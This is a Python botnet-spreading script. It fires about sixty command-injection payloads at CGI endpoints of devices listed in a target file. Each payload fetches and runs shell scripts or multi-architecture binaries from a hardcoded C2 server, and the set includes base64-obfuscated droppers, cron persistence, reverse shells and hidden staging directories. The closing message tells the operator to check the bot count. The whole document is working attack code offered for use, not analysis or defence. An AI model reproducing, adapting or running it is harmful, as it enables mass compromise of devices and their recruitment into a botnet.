#!/usr/bin/env python3
import requests
import threading
import time
import subprocess
from concurrent.futures import ThreadPoolExecutor

C2 = "72.62.37.166"
PORT = 3778

# ========== 50+ PAYLOADS ==========
PAYLOADS = [
    # Method 1-5: Your original + variations
    "cd /tmp; wget http://72.62.37.166/1.sh -O- | sh; curl http://72.62.37.166/1.sh | sh",
    "cd /tmp; wget http://72.62.37.166/1.sh; sh 1.sh; rm -f 1.sh",
    "cd /tmp; curl -O http://72.62.37.166/1.sh; sh 1.sh; rm -f 1.sh",
    "cd /tmp; tftp 72.62.37.166 -c get 1.sh; sh 1.sh; rm -f 1.sh",
    "cd /tmp; busybox wget http://72.62.37.166/1.sh -O- | sh",
    
    # Method 6-10: Direct binary downloads
    "cd /tmp; wget http://72.62.37.166/hiddenbin/Space.x86_64 -O Space; chmod +x Space; ./Space",
    "cd /tmp; wget http://72.62.37.166/hiddenbin/Space.i686 -O Space; chmod +x Space; ./Space",
    "cd /tmp; wget http://72.62.37.166/hiddenbin/Space.arm -O Space; chmod +x Space; ./Space",
    "cd /tmp; wget http://72.62.37.166/hiddenbin/Space.mips -O Space; chmod +x Space; ./Space",
    "cd /tmp; wget http://72.62.37.166/hiddenbin/Space.ppc -O Space; chmod +x Space; ./Space",
    
    # Method 11-15: Architecture detection
    "cd /tmp; wget http://72.62.37.166/hiddenbin/Space.$(uname -m) -O Space; chmod +x Space; ./Space",
    "cd /tmp; curl -O http://72.62.37.166/hiddenbin/Space.$(uname -m); mv Space.$(uname -m) Space; chmod +x Space; ./Space",
    "cd /tmp; wget http://72.62.37.166/hiddenbin/Space -O Space; chmod +x Space; ./Space",
    "cd /tmp; curl -O http://72.62.37.166/hiddenbin/Space; chmod +x Space; ./Space",
    "cd /tmp; tftp 72.62.37.166 -c get hiddenbin/Space; chmod +x Space; ./Space",
    
    # Method 16-20: Try all architectures
    "cd /tmp; for a in x86_64 i686 arm mips ppc sparc; do wget http://72.62.37.166/hiddenbin/Space.$a -O Space.$a; chmod +x Space.$a; ./Space.$a; done",
    "cd /tmp; for a in x86_64 i686 arm mips ppc sparc; do curl -O http://72.62.37.166/hiddenbin/Space.$a; chmod +x Space.$a; ./Space.$a; done",
    "cd /tmp; wget -r -l1 -np http://72.62.37.166/hiddenbin/; chmod +x hiddenbin/*; ./hiddenbin/Space*",
    "cd /tmp; curl -s http://72.62.37.166/hiddenbin/ | grep -o 'Space\\.[^\"]*' | xargs -I {} curl -O http://72.62.37.166/hiddenbin/{}; chmod +x Space*; ./Space*",
    
    # Method 21-25: FTP methods
    "cd /tmp; echo 'open 72.62.37.166\nuser anonymous pass\nbinary\nget hiddenbin/Space\nquit' | ftp -n; chmod +x Space; ./Space",
    "cd /tmp; ftpget -v -u anonymous -p anonymous -P 21 72.62.37.166 hiddenbin/Space Space; chmod +x Space; ./Space",
    "cd /tmp; ncftpget -u anonymous -p anonymous 72.62.37.166 . hiddenbin/Space; chmod +x Space; ./Space",
    
    # Method 26-30: Wget variations
    "cd /tmp; wget --tries=3 --timeout=10 http://72.62.37.166/1.sh -O- | sh",
    "cd /tmp; wget -q http://72.62.37.166/1.sh -O- | sh",
    "cd /tmp; wget --no-check-certificate http://72.62.37.166/1.sh -O- | sh",
    "cd /tmp; wget --user-agent='Mozilla/5.0' http://72.62.37.166/1.sh -O- | sh",
    
    # Method 31-35: Curl variations
    "cd /tmp; curl -fsSL http://72.62.37.166/1.sh | sh",
    "cd /tmp; curl -k http://72.62.37.166/1.sh | sh",
    "cd /tmp; curl --retry 3 --max-time 10 http://72.62.37.166/1.sh | sh",
    "cd /tmp; curl -H 'User-Agent: Mozilla/5.0' http://72.62.37.166/1.sh | sh",
    
    # Method 36-40: Python downloaders
    "cd /tmp; python -c 'import urllib; urllib.urlretrieve(\"http://72.62.37.166/1.sh\", \"1.sh\"); os.system(\"sh 1.sh\")'",
    "cd /tmp; python3 -c 'import urllib.request; urllib.request.urlretrieve(\"http://72.62.37.166/1.sh\", \"1.sh\"); import os; os.system(\"sh 1.sh\")'",
    "cd /tmp; perl -e 'use LWP::Simple; getstore(\"http://72.62.37.166/1.sh\", \"1.sh\"); system(\"sh 1.sh\")'",
    "cd /tmp; php -r 'copy(\"http://72.62.37.166/1.sh\", \"1.sh\"); system(\"sh 1.sh\");'",
    "cd /tmp; ruby -e 'require \"open-uri\"; open(\"1.sh\", \"wb\") { |f| f.write(open(\"http://72.62.37.166/1.sh\").read) }; system(\"sh 1.sh\")'",
    
    # Method 41-45: Echo base64
    "cd /tmp; echo 'IyEvYmluL2Jhc2gKd2dldCBodHRwOi8vNzIuNjIuMzcuMTY2LzEuc2ggLU8tIHwgc2gKY3VybCBodHRwOi8vNzIuNjIuMzcuMTY2LzEuc2ggfCBzaAp0ZnRwIC1yIDMuc2ggLWcgNzIuNjIuMzcuMTY2OyBzaCAzLnNoCnJtIC1yZiAqCg==' | base64 -d | sh",
    "cd /tmp; echo 'IyEvYmluL2Jhc2gKZm9yIGEgaW4geDg2XzY0IGk2ODYgYXJtIG1pcHMgcHBjIHNwYXJjOyBkbwogIHdnZXQgaHR0cDovLzcyLjYyLjM3LjE2Ni9oaWRkZW5iaW4vU3BhY2UuJGEgLU8gU3BhY2UuJGE7CiAgY2htb2QgK3ggU3BhY2UuJGE7CiAgLi9TcGFjZS4kYTsKZG9uZQpybSAtcmYgU3BhY2UuKgo=' | base64 -d | sh",
    
    # Method 46-50: Persistence + reverse shell
    "cd /tmp; wget http://72.62.37.166/1.sh -O- | sh; echo '*/5 * * * * curl -s http://72.62.37.166/1.sh | sh' | crontab -",
    "bash -i >& /dev/tcp/72.62.37.166/3778 0>&1 &",
    "cd /tmp; nohup bash -c 'while true; do bash -i >& /dev/tcp/72.62.37.166/3778 0>&1; sleep 60; done' &",
    "cd /tmp; mknod backpipe p; telnet 72.62.37.166 3778 0<backpipe | bash 1>backpipe",
    "cd /tmp; exec 5<>/dev/tcp/72.62.37.166/3778; cat <&5 | while read line; do $line 2>&5 >&5; done",
    
    # Method 51-55: Combined attacks
    "cd /tmp; wget http://72.62.37.166/1.sh -O- | sh & curl http://72.62.37.166/1.sh | sh & tftp 72.62.37.166 -c get 1.sh &",
    "cd /tmp; for i in 1 2 3; do wget http://72.62.37.166/1.sh -O- | sh; sleep 2; done",
    "cd /tmp; (wget http://72.62.37.166/1.sh -O- | sh) || (curl http://72.62.37.166/1.sh | sh) || (tftp 72.62.37.166 -c get 1.sh && sh 1.sh)",
    "cd /tmp; wget http://72.62.37.166/1.sh -O 1.sh; chmod +x 1.sh; ./1.sh; rm -f 1.sh; echo 'done' > /tmp/.infected",
    
    # Method 56-60: Hide and seek
    "cd /dev/shm; wget http://72.62.37.166/1.sh -O- | sh",
    "cd /var/tmp; wget http://72.62.37.166/1.sh -O- | sh",
    "cd /run; wget http://72.62.37.166/1.sh -O- | sh",
    "mkdir -p /tmp/.cache; cd /tmp/.cache; wget http://72.62.37.166/1.sh -O- | sh",
    "cd /tmp; wget http://72.62.37.166/1.sh -O .1.sh; sh .1.sh; rm -f .1.sh",
]

def exploit(ip):
    for i, payload in enumerate(PAYLOADS, 1):
        try:
            # URL encode
            import urllib.parse
            encoded = urllib.parse.quote(payload)
            
            # Try different endpoints
            urls = [
                f"http://{ip}/cgi-bin/setup.cgi?page={encoded}",
                f"http://{ip}/cgi-bin/ping.cgi?ip=127.0.0.1%3B{encoded}",
                f"http://{ip}/set_ftp.cgi?svr={encoded}&port=21",
                f"http://{ip}/cgi-bin/upload.cgi?cmd={encoded}",
            ]
            
            for url in urls:
                try:
                    r = requests.get(url, timeout=3, verify=False)
                    if r.status_code < 500:
                        print(f"[+] {ip} - Payload {i} sent")
                        return True
                except:
                    continue
        except:
            continue
    return False

def main():
    with open("ips.txt") as f:
        ips = [l.strip() for l in f if l.strip()]
    
    print(f"[*] Loaded {len(ips)} targets")
    print(f"[*] Firing 60 payloads at each target...\n")
    
    with ThreadPoolExecutor(max_workers=50) as e:
        list(e.map(exploit, ips))
    
    print("\n[+] Done. Check your bot count.")

if __name__ == "__main__":
    main()